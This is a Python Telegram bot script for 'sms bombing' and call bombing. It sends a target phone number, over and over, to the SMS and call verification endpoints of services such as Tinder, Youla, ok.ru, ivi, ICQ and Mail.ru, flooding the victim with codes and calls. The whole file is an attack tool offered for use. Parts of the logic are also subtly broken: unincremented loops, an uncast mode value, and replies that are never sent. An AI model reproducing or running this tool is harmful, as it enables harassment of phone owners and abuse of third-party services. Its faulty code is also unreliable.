#!/usr/bin/python3
import requests, os, sys, json, urllib, time
from colorama import Fore, Back, Style
session = requests.session()
TOKEN = ""#change this
URL = "https://api.telegram.org/bot{}/".format(TOKEN)
global sms_sent
global call_sent
sms_sent=0
call_sent=0
def isset(variable):
	return variable in locals() or variable in globals()
def sms(phone):
    global sms_sent
    ret=""
    phone=str(phone)
    time.sleep(0.5)
    try:
        r = session.post("https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru", json={"phone_number": phone})
        r=json.loads(r.text)
        if "data" in r:
            ret=ret+"Tinder Sent\n"
            sms_sent+=1
        else:
            ret=ret+"Tinder Error\n"
    except:
        ret=ret+"Tinder Error\n"
    try:
        r = session.post("https://youla.ru/web-api/auth/request_code", data={'phone': phone})
        r=json.loads(r.text)
        if "phone" in r:
            ret=ret+"Youla Sent\n"
            sms_sent+=1
        else:
            ret=ret+"Youla Error\n"
    except:
        ret=ret+"Youla Error\n"
    try:
        session.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + phone, "st.r.sendSms": "Get code by text message"})
        r = session.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI",data={"st.r.phone": "+" + phone, "st.r.sendSms": "Get code by text message"})
        ret=ret+"OK Sent\n"
        sms_sent+=1
    except:
        ret=ret+"OK Error\n"
    time.sleep(0.5)
    try:
        r = session.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": phone})
        r=json.loads(r.text)
        if "result" in r:
            ret=ret+"Ivi Sent\n"
            sms_sent+=1
        else:
            ret=ret+"Ivi error\n"
    except:
        ret=ret+"Ivi error\n"
    time.sleep(0.5)
    try:
        r = session.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={ "msisdn": phone, "locale": "en", "countryCode": "ru", "version": 1, "k": "ic1rtwz1s1Hj1O0r", "r": 46763})
        r=json.loads(r.text)
        if r["response"]["statusCode"]==200:
            ret=ret+"Icq Sent\n"
            sms_sent+=1
        else:
            ret=ret+"Icq error\n"
    except:
        ret=ret+"Icq error\n"
    try:
        r = session.post("https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
        r=json.loads(r.text)
        if r["success"]:
            ret=ret+"Delitime Sent\n"
            sms_sent+=1
        else:
            ret=ret+"Delitime Error\n"
    except:
        ret=ret+"Delitime Error\n"
    try:
        r = session.post("https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru", data={"phone": phone})
        if r.text.strip()!="":
            ret=ret+"Beltelecom Sent\n"
            sms_sent+=1
        else:
            ret=ret+"Beltelecom error\n"
    except:
        ret=ret+"Beltelecom error\n"
    time.sleep(0.5)
    try:
        r = session.post("https://cloud.mail.ru/api/v2/notify/applink", json={ "phone": "+" + phone, "api": 2, "email": "email", "x-email": "x-email"})
        r=json.loads(r.text)
        if "error" in r["body"]:
            ret=ret+"Mail Sent\n"
            sms_sent+=1
        else:
            ret=ret+"Mail Error\n"
    except:
        ret=ret+"Mail Error\n"
    return ret


def call(phone):
    global call_sent
    ret=""
    phone=str(phone)
    try:
        session.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data={"st.r.phone": "+" + phone, "st.r.fieldAcceptCallUIButton": "Call"})
        session.post("https://ok.ru/dk?cmd=AnonymRegistrationAcceptCallUI&st.cmd=anonymRegistrationAcceptCallUI", data={"st.r.phone": "+" + phone, "st.r.fieldAcceptCallUIButton": "Call"})
        ret=ret+"OK Call Sent\n"
        call_sent+=1
    except:
        ret=ret+"Ok Call Error\n"
    time.sleep(0.5)
    try:
        r = session.get("https://findclone.ru/register?phone=" + phone)
        r=json.loads(r.text)
        if "Error" in r:
            ret=ret+"Findeclone Call Error\n"
        else:
            ret=ret+"Findeclone Call Sent\n"
            call_sent+=1
    except:
        ret=ret+"Findeclone Call Error\n"
    return ret


def get_url(url):
    response = requests.get(url)
    content = response.content.decode("utf8")
    return content


def get_json_from_url(url):
    content = get_url(url)
    js = json.loads(content)
    return js


def get_updates(offset=None):
    url = URL + "getUpdates"
    if offset:
        url += "?offset={}".format(offset)
    js = get_json_from_url(url)
    return js

def get_last_update_id(updates):
    update_ids = []
    for update in updates["result"]:
        update_ids.append(int(update["update_id"]))
    return max(update_ids)


def echo_all(updates):
    for update in updates["result"]:
        text = update["message"]["text"]
        chat = update["message"]["chat"]["id"]
        send_message(text, chat)


def get_last_chat_id_and_text(updates):
    num_updates = len(updates["result"])
    last_update = num_updates - 1
    text = updates["result"][last_update]["message"]["text"]
    chat_id = updates["result"][last_update]["message"]["chat"]["id"]
    return (text, chat_id)


def send_message(text, chat_id):
    text = urllib.parse.quote_plus(text)
    url = URL + "sendMessage?text={}&chat_id={}".format(text, chat_id)
    get_url(url)


def main():
    global sms_sent
    global call_sent
    last_update_id = None
    while True:
        updates = get_updates(last_update_id)
        if len(updates["result"]) > 0:
                print("update")
                last_update_id = get_last_update_id(updates) + 1
                mess = updates["result"][0]["message"]["text"].strip().lower()
                if updates["result"][0]['message']['from']['username'].strip() == "":
                    username = updates["result"][0]['message']['from']['username']
                else:
                    username = updates["result"][0]['message']['from']['first_name']
                f = open(username+".json", "w")
                f.write(json.dumps(updates))
                f.close()
                message=""
                if mess == "start" or mess =="/start":
                    message = 'Hi '+username+"\nDo you want to start sms bombing? Yes/No"
                elif mess == "yes":
                    message = "Please choose attack mode\n[0] SMS\n[1] Call\n[2]Call and Sms\nPlease use phone number in international format\nwrite message with this format count:phonenumber:attackmode"
                elif ":" in mess:
                    pc=mess.split(":")
                    if 2 >= len(pc)-1:
                        pc.append(0)
                    pc[0]=int(pc[0])
                    pc[1]=int(pc[1])
                    if isinstance(pc[0], int) and isinstance(pc[1], int) and isinstance(pc[2], int) and pc[0]>0 and pc[2]>=0 and len(str(pc[1])) > 8 and len(str(pc[1])) < 12:
                        if pc[2]==0:
                            i=0
                            while pc[0]!=i:
                                message+=sms(pc[1])
                                i+=1
                            message=message+"sended sms: "+str(sms_sent)
                        elif pc[0]==1:
                            i=0
                            while pc[0]!=i:
                                message+=call(pc[1])
                            message=message+"sended calls: "+str(call_sent)
                        else:
                            i=0
                            while pc[0]!=i:
                                message+=sms(pc[1])
                                message+=call(pc[1])
                            message=message+"sended sms: "+str(sms_sent)+" sended calls: "+str(call_sent)
                    else:
                        message="Please choose attack mode\n[0] SMS\n[1] Call\n[2]Call and Sms\nPlease use phone number in international format\nwrite message with this format count:phonenumber:attackmode"
                else:
                    message="BYE!!!"
                time.sleep(0.5)
                call_sent=0
                sms_sent=0

if __name__ == '__main__':
    main()
